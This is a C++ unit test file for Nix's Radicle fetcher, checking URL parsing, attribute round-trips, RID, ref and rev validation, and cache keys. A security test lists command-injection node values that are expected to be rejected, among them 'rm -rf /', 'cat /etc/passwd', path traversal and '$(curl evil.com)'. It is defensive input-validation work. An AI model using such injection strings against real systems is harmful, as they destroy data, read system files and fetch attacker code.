#include "nix/fetchers/fetch-settings.hh"
#include "nix/fetchers/attrs.hh"
#include "nix/fetchers/fetchers.hh"
#include "nix/util/experimental-features.hh"
#include "nix/store/store-open.hh"
#include "nix/store/globals.hh"
#include "nix/store/dummy-store.hh"

#include <gtest/gtest.h>
#include <git2.h>

#include <string>
#include <filesystem>

namespace nix {

using fetchers::Attr;

// Test cases for Radicle URL parsing
struct RadicleURLTestCase
{
    std::string url;
    std::optional<fetchers::Attrs> expectedAttrs;
    std::string description;
};

class RadicleURLTest : public ::testing::WithParamInterface<RadicleURLTestCase>, public ::testing::Test
{
protected:
    void SetUp() override
    {
        initLibStore(/*loadConfig=*/false);
        // Enable Radicle experimental feature for tests
        experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    }
};

TEST_P(RadicleURLTest, parseURL)
{
    fetchers::Settings fetchSettings;
    const auto & testCase = GetParam();

    if (testCase.expectedAttrs.has_value()) {
        auto input = fetchers::Input::fromURL(fetchSettings, testCase.url, true);
        EXPECT_EQ(input.getType(), "rad");

        for (const auto & [key, value] : *testCase.expectedAttrs) {
            auto actualValue = input.attrs.at(key);
            EXPECT_EQ(actualValue, value) << "Attribute '" << key << "' mismatch";
        }
    } else {
        // Should throw or return nullopt
        EXPECT_THROW(
            fetchers::Input::fromURL(fetchSettings, testCase.url, true),
            std::exception
        );
    }
}

INSTANTIATE_TEST_SUITE_P(
    RadicleURL,
    RadicleURLTest,
    ::testing::Values(
        RadicleURLTestCase{
            .url = "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5",
            .expectedAttrs = fetchers::Attrs{
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
            },
            .description = "simple_rid",
        },
        RadicleURLTestCase{
            .url = "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5/main",
            .expectedAttrs = fetchers::Attrs{
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"ref", Attr("main")},
            },
            .description = "rid_with_branch",
        },
        RadicleURLTestCase{
            .url = "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5?rev=1234567890abcdef1234567890abcdef12345678",
            .expectedAttrs = fetchers::Attrs{
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"rev", Attr("1234567890abcdef1234567890abcdef12345678")},
            },
            .description = "rid_with_rev",
        },
        RadicleURLTestCase{
            .url = "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5?node=seed.example.com",
            .expectedAttrs = fetchers::Attrs{
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"node", Attr("seed.example.com")},
            },
            .description = "rid_with_node",
        },
        RadicleURLTestCase{
            .url = "rad://seed.example.com/z3gqcJUoA1n9HaHKufZs5FCSGazv5",
            .expectedAttrs = fetchers::Attrs{
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"node", Attr("seed.example.com")},
            },
            .description = "rid_with_authority_node",
        },
        RadicleURLTestCase{
            .url = "rad:invalid",
            .expectedAttrs = std::nullopt,
            .description = "invalid_rid_format",
        }
    ),
    [](const ::testing::TestParamInfo<RadicleURLTestCase> & info) { return info.param.description; }
);

// Test cases for Radicle attributes
struct RadicleAttrsTestCase
{
    fetchers::Attrs attrs;
    std::string expectedUrl;
    std::string description;
    fetchers::Attrs expectedAttrs = attrs;
};

class RadicleAttrsTest : public ::testing::WithParamInterface<RadicleAttrsTestCase>, public ::testing::Test
{
protected:
    void SetUp() override
    {
        initLibStore(/*loadConfig=*/false);
        // Enable Radicle experimental feature for tests
        experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    }
};

TEST_P(RadicleAttrsTest, attrsAreCorrectAndRoundTrips)
{
    fetchers::Settings fetchSettings;
    const auto & testCase = GetParam();

    auto input = fetchers::Input::fromAttrs(fetchSettings, fetchers::Attrs(testCase.attrs));

    EXPECT_EQ(input.toAttrs(), testCase.expectedAttrs);
    EXPECT_EQ(input.toURLString(), testCase.expectedUrl);

    auto input2 = fetchers::Input::fromAttrs(fetchSettings, input.toAttrs());
    EXPECT_EQ(input, input2);
    EXPECT_EQ(input.toAttrs(), input2.toAttrs());
}

INSTANTIATE_TEST_SUITE_P(
    RadicleAttrs,
    RadicleAttrsTest,
    ::testing::Values(
        RadicleAttrsTestCase{
            .attrs = {
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
            },
            .expectedUrl = "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5",
            .description = "simple_attrs",
        },
        RadicleAttrsTestCase{
            .attrs = {
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"ref", Attr("develop")},
            },
            .expectedUrl = "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5/develop",
            .description = "attrs_with_ref",
        },
        RadicleAttrsTestCase{
            .attrs = {
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"node", Attr("seed.radicle.xyz")},
            },
            .expectedUrl = "rad://seed.radicle.xyz/z3gqcJUoA1n9HaHKufZs5FCSGazv5",
            .description = "attrs_with_node",
        },
        RadicleAttrsTestCase{
            .attrs = {
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"ref", Attr("main")},
                {"rev", Attr("1234567890abcdef1234567890abcdef12345678")},
            },
            .expectedUrl = "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5/main?rev=1234567890abcdef1234567890abcdef12345678",
            .description = "attrs_with_ref_and_rev",
        }
    ),
    [](const ::testing::TestParamInfo<RadicleAttrsTestCase> & info) { return info.param.description; }
);

// Test RID validation
TEST(RadicleValidation, validRIDs)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Valid RIDs
    std::vector<std::string> validRIDs = {
        "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5",
        "rad:z42hL2jL4XNk6K8oHQaSWfMgCL7ji",
        "rad:zABCDEFGHIJKLMNOPQRSTUVWXYZ123456789abcdefghijklmnopqrstuvwxyz",
    };

    for (const auto & rid : validRIDs) {
        fetchers::Attrs attrs = {
            {"type", Attr("rad")},
            {"rid", Attr(rid)},
        };

        EXPECT_NO_THROW({
            auto input = fetchers::Input::fromAttrs(fetchSettings, std::move(attrs));
        }) << "RID should be valid: " << rid;
    }
}

TEST(RadicleValidation, invalidRIDs)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Invalid RIDs
    std::vector<std::string> invalidRIDs = {
        "invalid",
        "rad:",
        "rad",
        "z3gqcJUoA1n9HaHKufZs5FCSGazv5",
        "radicle:rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5",
    };

    for (const auto & rid : invalidRIDs) {
        fetchers::Attrs attrs = {
            {"type", Attr("rad")},
            {"rid", Attr(rid)},
        };

        EXPECT_THROW({
            auto input = fetchers::Input::fromAttrs(fetchSettings, std::move(attrs));
        }, std::exception) << "RID should be invalid: " << rid;
    }
}

// Test fixture for RadicleInput tests that need proper initialization
class RadicleInputTest : public ::testing::Test
{
protected:
    void SetUp() override
    {
        initLibStore(/*loadConfig=*/false);
        // Enable Radicle experimental feature for tests
        experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    }
};

// Test that Radicle inputs are locked when they have a rev
TEST_F(RadicleInputTest, isLocked)
{
    fetchers::Settings fetchSettings;

    // Input without rev is not locked
    {
        auto input = fetchers::Input::fromAttrs(fetchSettings, {
            {"type", Attr("rad")},
            {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
        });
        EXPECT_FALSE(input.isLocked(fetchSettings));
    }

    // Input with rev is locked
    {
        auto input = fetchers::Input::fromAttrs(fetchSettings, {
            {"type", Attr("rad")},
            {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
            {"rev", Attr("1234567890abcdef1234567890abcdef12345678")},
        });
        EXPECT_TRUE(input.isLocked(fetchSettings));
    }
}

// Test fingerprint generation
TEST_F(RadicleInputTest, fingerprint)
{
    fetchers::Settings fetchSettings;

    auto store = [] {
        auto cfg = make_ref<DummyStoreConfig>(StoreReference::Params{});
        cfg->readOnly = false;
        return cfg->openStore();
    }();

    // Without rev, fingerprint should be nullopt
    {
        auto input = fetchers::Input::fromAttrs(fetchSettings, {
            {"type", Attr("rad")},
            {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
        });
        auto fp = input.getFingerprint(*store);
        EXPECT_FALSE(fp.has_value());
    }

    // With rev, fingerprint should be the rev itself
    {
        auto input = fetchers::Input::fromAttrs(fetchSettings, {
            {"type", Attr("rad")},
            {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
            {"rev", Attr("1234567890abcdef1234567890abcdef12345678")},
        });
        auto fp = input.getFingerprint(*store);
        EXPECT_TRUE(fp.has_value());
        EXPECT_EQ(*fp, "1234567890abcdef1234567890abcdef12345678");
    }
}

// Integration test with a mock Radicle repository
// Since Radicle repos are Git repos, we can test the Git aspects
class RadicleIntegrationTest : public ::testing::Test
{
protected:
    std::filesystem::path tmpDir;
    std::unique_ptr<AutoDelete> delTmpDir;

    void SetUp() override
    {
        experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
        tmpDir = createTempDir();
        delTmpDir = std::make_unique<AutoDelete>(tmpDir, /*recursive=*/true);
        nix::initLibStore(/*loadConfig=*/false);
        git_libgit2_init();
    }

    void TearDown() override
    {
        delTmpDir.reset();
        git_libgit2_shutdown();
    }

    // RAII wrappers for git resources to prevent leaks
    struct GitRepositoryDeleter {
        void operator()(git_repository * p) const { if (p) git_repository_free(p); }
    };
    using UniqueGitRepository = std::unique_ptr<git_repository, GitRepositoryDeleter>;

    struct GitIndexDeleter {
        void operator()(git_index * p) const { if (p) git_index_free(p); }
    };
    using UniqueGitIndex = std::unique_ptr<git_index, GitIndexDeleter>;

    struct GitTreeDeleter {
        void operator()(git_tree * p) const { if (p) git_tree_free(p); }
    };
    using UniqueGitTree = std::unique_ptr<git_tree, GitTreeDeleter>;

    struct GitSignatureDeleter {
        void operator()(git_signature * p) const { if (p) git_signature_free(p); }
    };
    using UniqueGitSignature = std::unique_ptr<git_signature, GitSignatureDeleter>;

    struct GitReferenceDeleter {
        void operator()(git_reference * p) const { if (p) git_reference_free(p); }
    };
    using UniqueGitReference = std::unique_ptr<git_reference, GitReferenceDeleter>;

    // Helper to create a simple git repo that simulates a Radicle repo
    std::filesystem::path createMockRadicleRepo(const std::string & name)
    {
        auto repoPath = tmpDir / name;

        // Initialize repository with RAII wrapper
        git_repository * rawRepo = nullptr;
        if (git_repository_init(&rawRepo, repoPath.string().c_str(), /*is_bare=*/0) < 0) {
            throw Error("Failed to initialize git repository: %s", git_error_last()->message);
        }
        UniqueGitRepository repo(rawRepo);

        // Create and commit a file
        writeFile(repoPath / "README.md", "# Mock Radicle Repository\n");

        // Get repository index with RAII wrapper
        git_index * rawIdx = nullptr;
        if (git_repository_index(&rawIdx, repo.get()) < 0) {
            throw Error("Failed to get repository index");
        }
        UniqueGitIndex idx(rawIdx);

        // Add files to index
        if (git_index_add_all(idx.get(), nullptr, 0, nullptr, nullptr) < 0 ||
            git_index_write(idx.get()) < 0) {
            throw Error("Failed to add files to index");
        }

        // Write tree
        git_oid treeId{};
        if (git_index_write_tree(&treeId, idx.get()) < 0) {
            throw Error("Failed to write tree");
        }

        // Lookup tree with RAII wrapper
        git_tree * rawTree = nullptr;
        if (git_tree_lookup(&rawTree, repo.get(), &treeId) < 0) {
            throw Error("Failed to lookup tree");
        }
        UniqueGitTree tree(rawTree);

        // Create signature with RAII wrapper
        git_signature * rawSig = nullptr;
        if (git_signature_now(&rawSig, "Test User", "test@example.com") < 0) {
            throw Error("Failed to create signature");
        }
        UniqueGitSignature sig(rawSig);

        // Create commit
        git_oid commitId{};
        if (git_commit_create_v(&commitId, repo.get(), "HEAD", sig.get(), sig.get(),
                                nullptr, "Initial commit", tree.get(), 0) < 0) {
            throw Error("Failed to create commit");
        }

        // Create main branch reference
        git_reference * rawRef = nullptr;
        if (git_reference_create(&rawRef, repo.get(), "refs/heads/main", &commitId, true, nullptr) < 0) {
            warn("Failed to create main branch reference");
        } else {
            // Use RAII wrapper for the reference if it was created successfully
            UniqueGitReference ref(rawRef);
        }

        // Set HEAD
        if (git_repository_set_head(repo.get(), "refs/heads/main") < 0) {
            warn("Failed to set HEAD");
        }

        // All resources automatically freed by RAII wrappers
        return repoPath;
    }
};

// Test that we can parse Radicle URLs and convert to Git operations
TEST_F(RadicleIntegrationTest, parseRadicleURLAndValidateStructure)
{
    fetchers::Settings fetchSettings;

    // Test that we can parse a Radicle URL
    auto input = fetchers::Input::fromURL(fetchSettings, "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5/main", true);

    EXPECT_EQ(input.getType(), "rad");
    EXPECT_TRUE(input.attrs.contains("rid"));
    EXPECT_TRUE(input.attrs.contains("ref"));
    EXPECT_EQ(fetchers::getStrAttr(input.attrs, "rid"), "rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5");
    EXPECT_EQ(fetchers::getStrAttr(input.attrs, "ref"), "main");
}

// Test attribute round-tripping
TEST_F(RadicleIntegrationTest, attributeRoundTrip)
{
    fetchers::Settings fetchSettings;

    fetchers::Attrs originalAttrs = {
        {"type", Attr("rad")},
        {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
        {"ref", Attr("develop")},
    };

    auto input1 = fetchers::Input::fromAttrs(fetchSettings, std::move(originalAttrs));
    auto url = input1.toURLString();
    auto input2 = fetchers::Input::fromURL(fetchSettings, url, true);

    EXPECT_EQ(input1.toAttrs(), input2.toAttrs());
}

// Test that RID validation works
TEST_F(RadicleIntegrationTest, ridValidation)
{
    fetchers::Settings fetchSettings;

    // Valid RID should work
    EXPECT_NO_THROW({
        auto input = fetchers::Input::fromAttrs(fetchSettings, {
            {"type", Attr("rad")},
            {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
        });
    });

    // Invalid RID should throw
    EXPECT_THROW({
        auto input = fetchers::Input::fromAttrs(fetchSettings, {
            {"type", Attr("rad")},
            {"rid", Attr("not-a-valid-rid")},
        });
    }, std::exception);
}

// =============================================================================
// SECURITY TESTS - CRITICAL
// =============================================================================

TEST(RadicleSecurity, rejectCommandInjectionInNode)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Test various command injection attempts
    std::vector<std::string> maliciousNodes = {
        "node;rm -rf /",
        "node`whoami`",
        "node$(id)",
        "node|cat /etc/passwd",
        "../../../etc/passwd",
        "node&&echo pwned",
        "node||echo pwned",
        "node\nrm -rf /",
        "node;$(curl evil.com)",
        "127.0.0.1;whoami",
    };

    for (const auto & maliciousNode : maliciousNodes) {
        EXPECT_THROW({
            auto input = fetchers::Input::fromAttrs(fetchSettings, {
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"node", Attr(maliciousNode)},
            });
        }, std::exception) << "Should reject malicious node: " << maliciousNode;
    }
}

TEST(RadicleSecurity, acceptValidNodes)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Test valid node identifiers
    std::vector<std::string> validNodes = {
        "seed.radicle.xyz",
        "node-1.example.com",
        "192.168.1.1",
        "localhost",
        "my-seed-node",
        "seed123",
        "a.b.c.d.e.f.com",
    };

    for (const auto & validNode : validNodes) {
        EXPECT_NO_THROW({
            auto input = fetchers::Input::fromAttrs(fetchSettings, {
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"node", Attr(validNode)},
            });
        }) << "Should accept valid node: " << validNode;
    }
}

TEST(RadicleSecurity, rejectExcessivelyLongNodes)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Create a node name that exceeds MAX_DOMAIN_NAME_LENGTH (253)
    std::string tooLongNode(260, 'a');

    EXPECT_THROW({
        auto input = fetchers::Input::fromAttrs(fetchSettings, {
            {"type", Attr("rad")},
            {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
            {"node", Attr(tooLongNode)},
        });
    }, std::exception) << "Should reject overly long node names";
}

TEST(RadicleSecurity, rejectExcessivelyLongRIDs)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Create a RID that exceeds MAX_RADICLE_ID_LENGTH (100)
    std::string tooLongRID = "rad:z" + std::string(110, '0');

    EXPECT_THROW({
        auto input = fetchers::Input::fromAttrs(fetchSettings, {
            {"type", Attr("rad")},
            {"rid", Attr(tooLongRID)},
        });
    }, std::exception) << "Should reject overly long RIDs";
}

// =============================================================================
// CACHE MANAGEMENT TESTS
// =============================================================================

TEST(RadicleCache, cachePathDeterministic)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Create two identical inputs
    auto input1 = fetchers::Input::fromAttrs(fetchSettings, {
        {"type", Attr("rad")},
        {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
    });

    auto input2 = fetchers::Input::fromAttrs(fetchSettings, {
        {"type", Attr("rad")},
        {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
    });

    // Cache paths should be identical
    EXPECT_EQ(input1.toAttrs(), input2.toAttrs());
}

TEST(RadicleCache, nodeAffectsCachePath)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Create inputs with different nodes
    auto inputNoNode = fetchers::Input::fromAttrs(fetchSettings, {
        {"type", Attr("rad")},
        {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
    });

    auto inputWithNode = fetchers::Input::fromAttrs(fetchSettings, {
        {"type", Attr("rad")},
        {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
        {"node", Attr("seed.example.com")},
    });

    // Inputs should be different (node affects cache key)
    EXPECT_NE(inputNoNode.toAttrs(), inputWithNode.toAttrs());
}

TEST(RadicleCache, refDoesNotAffectCacheKey)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Create inputs with different refs
    auto inputMain = fetchers::Input::fromAttrs(fetchSettings, {
        {"type", Attr("rad")},
        {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
        {"ref", Attr("main")},
    });

    auto inputDevelop = fetchers::Input::fromAttrs(fetchSettings, {
        {"type", Attr("rad")},
        {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
        {"ref", Attr("develop")},
    });

    // Both should have the same RID and node (cache key components)
    EXPECT_EQ(fetchers::getStrAttr(inputMain.toAttrs(), "rid"),
              fetchers::getStrAttr(inputDevelop.toAttrs(), "rid"));
}

// =============================================================================
// REF AND REV VALIDATION TESTS
// =============================================================================

TEST(RadicleValidation, refNameValidation)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Invalid ref names
    std::vector<std::string> invalidRefs = {
        "..",
        ".",
        "ref..name",
        "ref//../path",
        "ref~1",
        "ref^1",
        "ref:colon",
        "ref[bracket",
        "ref*asterisk",
        "ref?question",
        " leadingspace",
        "trailingspace ",
    };

    for (const auto & invalidRef : invalidRefs) {
        EXPECT_THROW({
            auto input = fetchers::Input::fromAttrs(fetchSettings, {
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"ref", Attr(invalidRef)},
            });
        }, std::exception) << "Should reject invalid ref: " << invalidRef;
    }
}

TEST(RadicleValidation, validRefNames)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Valid ref names
    std::vector<std::string> validRefs = {
        "main",
        "develop",
        "feature/my-feature",
        "release-1.0",
        "hotfix_urgent",
        "v1.2.3",
    };

    for (const auto & validRef : validRefs) {
        EXPECT_NO_THROW({
            auto input = fetchers::Input::fromAttrs(fetchSettings, {
                {"type", Attr("rad")},
                {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
                {"ref", Attr(validRef)},
            });
        }) << "Should accept valid ref: " << validRef;
    }
}

TEST(RadicleValidation, revFormatAccepted)
{
    experimentalFeatureSettings.experimentalFeatures.get().insert(Xp::Radicle);
    fetchers::Settings fetchSettings;

    // Valid SHA-1 (40 hex characters) - accepted at input creation time
    // Note: Full validation happens later when rev is actually used
    EXPECT_NO_THROW({
        auto input = fetchers::Input::fromAttrs(fetchSettings, {
            {"type", Attr("rad")},
            {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
            {"rev", Attr("1234567890abcdef1234567890abcdef12345678")},
        });
    });

    // Test that rev is properly stored
    auto input = fetchers::Input::fromAttrs(fetchSettings, {
        {"type", Attr("rad")},
        {"rid", Attr("rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5")},
        {"rev", Attr("abcdef1234567890abcdef1234567890abcdef12")},
    });

    EXPECT_TRUE(input.getRev().has_value());
    EXPECT_EQ(input.getRev()->gitRev(), "abcdef1234567890abcdef1234567890abcdef12");
}

} // namespace nix
